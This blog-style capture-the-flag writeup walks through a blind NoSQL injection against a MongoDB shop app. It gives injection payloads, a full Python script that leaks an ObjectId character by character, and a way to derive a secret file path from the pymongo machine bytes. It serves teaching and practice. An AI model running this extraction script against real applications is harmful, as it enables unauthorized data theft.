---
layout: post
title: "ShopZone CTF — Blind NoSQL Injection & ObjectId Leak Writeup"
date: 2025-04-01
category: ctf
difficulty: medium
platform: CYBERTEK
tags: [nosql-injection, blind-injection, mongodb, objectid, web, ctf]
description: "Exploiting blind NoSQL injection to leak a MongoDB ObjectId, extract machine bytes from pymongo 3.6.1, and derive a secret file path to read the flag."
---

## Overview

ShopZone is a an e-commerce CTF challenge. You can register, log in, and browse products. The goal is to read a secret file hidden on the server.

The intended path: blind NoSQL injection → ObjectId extraction → machine byte leak → Python `random` seed derivation → flag path.

---

## Step 1 — Recon: What does the app do?

After registering and logging in, you see a product catalog with a search bar. Two search endpoints exist:

- `GET /search?name=khalil` — normal browser search
- `POST /search` with a JSON body , API-style search

The POST endpoint is the interesting one. Looking at the source:

```python
filter_ = request.get_json(silent=True) or {}
products = list(db.products.find(filter_, {"_id": 0, "name": 1, "category": 1, "price": 1, "seller": 1}))
```

The JSON body is passed **directly** into a MongoDB query with zero sanitization — classic NoSQL Injection.

---

## Step 2 — NoSQL Injection: Confirming the vector

MongoDB supports operators like `$gt`, `$ne`, `$regex`. Since the filter comes straight from user input, we can use any of them.

Confirm injection with:

```http
POST /search HTTP/1.1
Content-Type: application/json

{"name": {"$gt": ""}}
```

All products returned -> injection confirmed.

Now, looking at the seed script, every product has an `owner_id` field (the admin's MongoDB ObjectId). But the server only returns `name`, `category`, `price`, `seller` — `owner_id` is never exposed. This means we need **blind** injection.

---

## Step 3 — Blind NoSQL Injection via Regex

The trick: use `$regex` to ask yes/no questions about `owner_id`. Products returned = match, empty array = no match.

```http
POST /search HTTP/1.1
Content-Type: application/json

{"owner_id": {"$regex": "^a"}}
```

We extract the full ObjectId one character at a time. A MongoDB ObjectId is a **24-character hex string**, so we only test `0–9` and `a–f` at each position.

Automation script:

```python
import requests
import string

TARGET = "http://<challenge-host>"
CHARSET = string.digits + "abcdef"  # ObjectId is hex

s = requests.Session()
s.post(f"{TARGET}/register", data={"username": "hacker", "password": "hacker123"})
s.post(f"{TARGET}/login",    data={"username": "hacker", "password": "hacker123"})

owner_id = ""
while len(owner_id) < 24:
    for ch in CHARSET:
        resp = s.post(
            f"{TARGET}/search",
            json={"owner_id": {"$regex": f"^{owner_id}{ch}"}},
            headers={"Content-Type": "application/json"}
        )
        if resp.json():  # non-empty -> character matches
            owner_id += ch
            print(f"[+] Progress: {owner_id}")
            break

print(f"[+] owner_id = {owner_id}")
```

The script finished and we get the full ObjectId:

```
6634a1f2b3c2e1a0f9d87654
```

---

## Step 4 — What's inside a MongoDB ObjectId?

A MongoDB ObjectId is a 12-byte (24 hex char) value structured as:

| 4 bytes   | 3 bytes    | 2 bytes    | 3 bytes |
|-----------|------------|------------|---------|
| Unix time | Machine ID | Process ID | Counter |

The key detail: **pymongo 3.6.1** generates the machine ID as `md5(socket.gethostname())[:3]` — the first 3 bytes of the MD5 hash of the container hostname.

So bytes 4–6 of the ObjectId (hex chars 8–13) are exactly `md5(hostname)[:3]` — the same value used in `seed.py` to derive the secret.

```python
import binascii

owner_id = "6634a1f2b3c2e1a0f9d87654"
raw = binascii.unhexlify(owner_id)
machine_bytes = raw[4:7]  # = md5(hostname)[:3]
print(machine_bytes.hex()) 
```

---

## Step 5 — Derive the Secret

`seed.py` derives the flag filename like this:

```python
import hashlib, socket, random

machine_bytes = hashlib.md5(socket.gethostname().encode()).digest()[:3]
seed = int.from_bytes(machine_bytes, "big")
r = random.Random()
r.seed(seed)
secret = hex(r.getrandbits(64))[2:].zfill(16)
```

We already have `machine_bytes` from the ObjectId , no need to know the hostname. Plug it in directly:

```python
import random, binascii

owner_id = "6634a1f2b3c2e1a0f9d87654"
raw = binascii.unhexlify(owner_id)

machine_bytes = raw[4:7]
seed = int.from_bytes(machine_bytes, "big")

r = random.Random()
r.seed(seed)
secret = hex(r.getrandbits(64))[2:].zfill(16)

print(f"[+] Secret:    {secret}")
print(f"[+] Flag path: /backup/flag_{secret}")
```

---

## Step 6 — Get the Flag

Navigate to the derived path:

```
GET /backup/flag_<your_secret>
```

```
CyberTEK{my_machine_id_isnt_random_after_all}
```

---


---

## Summary

| Step | Technique |
|------|-----------|
| Confirm injection | `{"name": {"$gt": ""}}` returns all products |
| Blind extraction | `$regex` on `owner_id`, one hex char at a time |
| Machine byte leak | Bytes 4–6 of ObjectId = `md5(hostname)[:3]` in pymongo 3.6.1 |
| Secret derivation | Seed `random.Random` with machine bytes → `getrandbits(64)` |
| Flag retrieval | `GET /backup/flag_<secret>` |


Hope you learned something new! ✌️
